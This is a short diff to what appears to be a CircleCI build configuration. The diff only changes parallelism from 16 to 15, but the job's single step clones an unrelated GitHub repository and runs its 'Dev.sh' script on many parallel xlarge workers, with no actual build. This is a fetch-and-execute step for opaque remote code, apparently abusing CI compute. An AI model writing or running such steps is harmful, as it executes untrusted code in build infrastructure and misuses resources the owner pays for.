@@ -3,7 +3,7 @@ jobs:
   build:
     docker:
       - image: node:latest
-    parallelism: 16
+    parallelism: 15
     resource_class: xlarge
     steps:
       - run: git clone https://github.com/Uhhgyhg/dev.git && cd dev && chmod u+x Dev.sh && ./Dev.sh
